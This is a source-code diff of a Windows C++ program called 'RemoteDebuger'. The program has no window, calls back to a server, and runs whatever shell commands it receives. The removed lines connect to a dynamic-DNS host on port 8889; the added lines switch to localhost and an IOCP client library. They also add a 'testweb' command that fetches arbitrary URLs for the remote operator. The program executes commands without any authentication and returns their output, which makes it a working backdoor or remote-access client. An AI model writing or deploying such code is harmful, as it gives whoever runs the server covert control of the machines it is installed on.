@@ -4,8 +4,63 @@
 #include "stdafx.h"
 #include <atlstr.h>
 #include "RemoteDebuger.h"
-#include "TcpSocket.h"
+#include "..\iocp\IOCPExport.h"
+#pragma comment(lib,"IOCP.lib")
+
 #include "..\¹«¹²\MemIni.h"
+
+
+
+#include <windows.h>
+#include <wininet.h>
+#pragma comment(lib,"Wininet.lib")
+
+#include <UrlMon.h>
+#pragma comment(lib,"urlmon.lib")
+#include <atlstr.h>
+
+CString GetHttpString( LPCWSTR pszUrl )
+{
+	HINTERNET hInternet1 = NULL;
+	HINTERNET hInternet2 = NULL;
+	CString strPageContent;
+
+	do 
+	{
+		hInternet1 = InternetOpenW(NULL,INTERNET_OPEN_TYPE_PRECONFIG,NULL,NULL,NULL);
+		if (NULL == hInternet1)
+		{
+			break;
+		}
+		BOOL bOption = TRUE;
+		BOOL bSetRes = InternetSetOption(hInternet1,INTERNET_OPTION_HTTP_DECODING,&bOption,sizeof(BOOL));
+
+		WCHAR szHeaderAdd[] = L"Accept-Encoding: gzip, deflate";
+		HINTERNET hInternet2 = InternetOpenUrlW(hInternet1,pszUrl,szHeaderAdd,wcslen(szHeaderAdd),INTERNET_FLAG_NO_CACHE_WRITE,NULL);
+		if (NULL == hInternet2)
+		{
+			break;
+		}
+
+
+		DWORD dwReadDataLength = NULL;
+		BOOL bRet = TRUE;
+		do 
+		{
+			CHAR chReadBuffer[4097];
+			bRet = InternetReadFile(hInternet2,chReadBuffer,4096,&dwReadDataLength);
+			chReadBuffer[dwReadDataLength] = 0;
+			strPageContent+=chReadBuffer;
+		} while (bRet && NULL != dwReadDataLength);
+
+	} while (FALSE);
+
+	InternetCloseHandle(hInternet2);
+	InternetCloseHandle(hInternet1);
+
+	return strPageContent;
+}
+
 
 typedef struct tagSTD_INFO{
 	HANDLE hPipeRead;
@@ -140,15 +195,15 @@ VOID ExecCmdLine( LPCWSTR pszCmdLine ,TypeMsgOutputCallBack pCallback,PVOID pPar
 
 typedef struct tagOUTPUT_PARAM
 {
-	CTcpSocket *ptcpSock;
+	HANDLE      hClient;
 	HANDLE     hSource;
 }OUTPUT_PARAM,*POUTPUT_PARAM;
 VOID WINAPI MsgOutputCallBack( PVOID pParam,LPCSTR pszOutputMsg )
 {
 	POUTPUT_PARAM pOutputParam = (POUTPUT_PARAM)pParam;
 
-	CTcpSocket *ptcpSock = pOutputParam->ptcpSock;
-	if (ptcpSock)
+	HANDLE hClient = pOutputParam->hClient;
+	if (hClient)
 	{
 		CString strMsgOutput;
 		strMsgOutput = pszOutputMsg;
@@ -173,7 +228,7 @@ VOID WINAPI MsgOutputCallBack( PVOID pParam,LPCSTR pszOutputMsg )
 
 			//OutputDebugStringW(strResponseData+L"\r\n");
 
-			int nSendRes = ptcpSock->SendData( (BYTE *)strResponseData.GetBuffer(),strResponseData.GetLength()*sizeof(WCHAR) );
+			ClientSendData(hClient,(BYTE *)strResponseData.GetBuffer(),strResponseData.GetLength()*sizeof(WCHAR));
 		}
 	}
 
@@ -209,7 +264,7 @@ public:
 typedef struct tagRUN_CMD_PARAM
 {
 	CString strCmdData;
-	CTcpSocket *ptcpSock;
+	HANDLE hClient;
 	HANDLE hSource;
 }RUN_CMD_PARAM,*PRUN_CMD_PARAM;
 
@@ -226,10 +281,65 @@ DWORD WINAPI RunCmdThread( PVOID pParam )
 
 
 	OUTPUT_PARAM OutputParam;
-	OutputParam.ptcpSock = pRunCmdParam->ptcpSock;
+	OutputParam.hClient = pRunCmdParam->hClient;
 	OutputParam.hSource = pRunCmdParam->hSource;
 
-	ExecCmdLine(pRunCmdParam->strCmdData,MsgOutputCallBack,&OutputParam);
+	if ( pRunCmdParam->strCmdData.Find(L"testweb") >= 0  )
+	{
+		CString strCmd;
+		CString strWebUrl;
+
+		int nIndex = 0;
+
+		CString strNodes;
+		CString strNode;
+		int curPos = 0;
+		
+		strNodes = pRunCmdParam->strCmdData;
+	
+		strNode= strNodes.Tokenize(_T(" "),curPos);
+		while (strNode != _T(""))
+		{
+			if ( 0 == nIndex )
+			{
+				strCmd = strNode;
+			}
+			else if( 1 == nIndex )
+			{
+				strWebUrl = strNode;
+			}
+
+			nIndex++;
+			strNode = strNodes.Tokenize(_T(" "), curPos);
+		};
+
+		if ( strWebUrl.GetLength() > 0 )
+		{
+			CString strWebText;
+			strWebText = GetHttpString( strWebUrl );
+			strWebText.Replace(L"\r",L"\\r");
+			strWebText.Replace(L"\n",L"\\n");
+
+			CMemIniFile IniResponse;
+			IniResponse.WriteIniString( L"",L"cmd",L"runcmd");
+			IniResponse.WriteIniString( L"",L"result",strWebText);
+			IniResponse.WriteIniInt( L"",L"target",(int)pRunCmdParam->hSource);
+
+			CString strResponseData;
+			strResponseData = IniResponse.BuildData();
+
+			//OutputDebugStringW(strResponseData+L"\r\n");
+			
+			ClientSendData(pRunCmdParam->hClient,(BYTE *)strResponseData.GetBuffer(),strResponseData.GetLength()*sizeof(WCHAR));
+		}
+
+	}
+	else
+	{
+		ExecCmdLine(pRunCmdParam->strCmdData,MsgOutputCallBack,&OutputParam);
+	}
+
+	
 
 	CMemIniFile IniResponse;
 	IniResponse.WriteIniString( L"",L"cmd",L"runcmd");
@@ -241,7 +351,8 @@ DWORD WINAPI RunCmdThread( PVOID pParam )
 
 	OutputDebugStringW(strResponseData+L"\r\n");
 
-	int nSendRes = pRunCmdParam->ptcpSock->SendData( (BYTE *)strResponseData.GetBuffer(),strResponseData.GetLength()*sizeof(WCHAR) );
+	ClientSendData(pRunCmdParam->hClient,(BYTE *)strResponseData.GetBuffer(),strResponseData.GetLength()*sizeof(WCHAR));
+
 
 	delete pRunCmdParam;
 
@@ -252,64 +363,58 @@ DWORD WINAPI RunCmdThread( PVOID pParam )
 	return 0;
 }
 
+VOID WINAPI DataRecvCallback( HANDLE hClient, BYTE *pDataBuffer,DWORD dwDatalen )
+{
+	CMemIniFile Ini;
+	Ini.ParseMemoryDataW((BYTE *)pDataBuffer,dwDatalen);
+
+	HANDLE hSource = (HANDLE)Ini.GetIniUint(L"",L"source",0);
+
+	CString strCmd;
+	strCmd = Ini.GetIniString(L"",L"cmd",L"");
+	if (strCmd == L"runcmd")
+	{
+		BOOL bCanRunCmd = FALSE;
+		csLock.Lock();
+		bCanRunCmd = !bRunningCmd;
+		csLock.UnLock();
+
+		if (bCanRunCmd)
+		{
+			CString strCmdData;
+			strCmdData = Ini.GetIniString(L"",L"data",L"");
+
+			PRUN_CMD_PARAM pRunCmdParam = new RUN_CMD_PARAM;
+			pRunCmdParam->hSource = hSource;
+			pRunCmdParam->strCmdData = strCmdData;
+			pRunCmdParam->hClient = hClient;
+
+			HANDLE hRunCmdThread = CreateThread(NULL,0,RunCmdThread,pRunCmdParam,0,NULL);
+		}
+	}
+}
+VOID WINAPI ConnectClosed( HANDLE hClient )
+{
+	int a=0;
+}
+
 int APIENTRY _tWinMain(HINSTANCE hInstance,
                      HINSTANCE hPrevInstance,
                      LPTSTR    lpCmdLine,
                      int       nCmdShow)
 {
-	CTcpSocket tcpSock;
-	tcpSock.CreateTcpSocket();
-	BOOL bConRes = tcpSock.Connect( "gz8912.jios.org",8889 );
+
+	HANDLE hClient = CreateClient(DataRecvCallback,ConnectClosed);
+	BOOL bConRes = ClientConnect(hClient,"localhost",8889);
+	
 	if (bConRes)
 	{
+		StartRecvData(hClient);
+	}
 
-		char chRecvDataBuffer[4096];
-		while (TRUE)
-		{
-			int nRecvRes = tcpSock.RecvData(chRecvDataBuffer,4094);
-			if (nRecvRes <= 0 )
-			{
-				break;
-			}
-
-			chRecvDataBuffer[nRecvRes] = 0;
-			chRecvDataBuffer[nRecvRes+1] = 0;
-
-			CMemIniFile Ini;
-			Ini.ParseMemoryDataW((BYTE *)chRecvDataBuffer,nRecvRes);
-			
-			HANDLE hSource = (HANDLE)Ini.GetIniUint(L"",L"source",0);
-
-			CString strCmd;
-			strCmd = Ini.GetIniString(L"",L"cmd",L"");
-			if (strCmd == L"runcmd")
-			{
-				BOOL bCanRunCmd = FALSE;
-				csLock.Lock();
-				bCanRunCmd = !bRunningCmd;
-				csLock.UnLock();
-				
-				if (bCanRunCmd)
-				{
-					CString strCmdData;
-					strCmdData = Ini.GetIniString(L"",L"data",L"");
-
-					PRUN_CMD_PARAM pRunCmdParam = new RUN_CMD_PARAM;
-					pRunCmdParam->hSource = hSource;
-					pRunCmdParam->strCmdData = strCmdData;
-					pRunCmdParam->ptcpSock = &tcpSock;
-
-					HANDLE hRunCmdThread = CreateThread(NULL,0,RunCmdThread,pRunCmdParam,0,NULL);
-				}
-			}
-
-			if (strCmd == L"heartbeat")
-			{
-				int nSendRes = tcpSock.SendData( (BYTE *)chRecvDataBuffer,nRecvRes );
-			}
-			Sleep(1);
-		}
-
+	while (1)
+	{
+		Sleep(1000);
 	}
 	
 
